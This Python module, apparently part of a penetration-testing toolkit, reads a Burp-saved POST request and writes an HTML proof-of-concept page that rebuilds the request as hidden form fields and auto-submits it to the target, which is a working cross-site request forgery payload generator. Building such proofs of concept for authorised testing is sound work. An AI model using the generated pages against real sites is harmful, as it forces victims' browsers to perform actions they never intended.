#!/usr/bin/python3
"""
CSRF PoC Generator — adapted from kryptohaker/CSRFPoC.

Reads a Burp-saved POST request file and generates an auto-submitting
HTML proof-of-concept page.

Usage:
  ../.venv/bin/python3 modules/csrf_poc.py -r request.req -o poc.html
"""
import argparse
import re
from urllib.parse import unquote

import Burpee.burpee as burp
from core.colors import bold, underline, end, good, info, run


def generate(request_file: str, output_file: str = "PoC.html") -> str:
    headers, body = burp.parse_request(request_file)
    method, resource = burp.get_method_and_resource(request_file)

    host     = headers.get("Host", "")
    origin   = headers.get("Origin", "")
    protocol = re.search(r"(https?://)", origin).group(1) if origin else "https://"
    full_url = f"{protocol}{host}{resource}"

    body = unquote(body.strip())
    form_inputs = []
    for param in body.split("&"):
        if "=" in param:
            name, _, value = param.partition("=")
            form_inputs.append(
                f'        <input type="hidden" name="{name}" value="{value}">\n'
            )

    html = f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
    <form method="{method}" action="{full_url}">
{''.join(form_inputs)}    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>"""

    with open(output_file, "w") as f:
        f.write(html)

    print(f"{good} {bold}CSRF PoC written to{end}: {output_file}")
    print(f"{info} Target: {full_url}")
    return html


def main():
    parser = argparse.ArgumentParser(description="Generate a CSRF PoC HTML file from a Burp request file")
    parser.add_argument("-r", "--request", required=True, help="Burp request file")
    parser.add_argument("-o", "--output", default="PoC.html", help="Output HTML file (default: PoC.html)")
    args = parser.parse_args()
    generate(args.request, args.output)


if __name__ == "__main__":
    main()
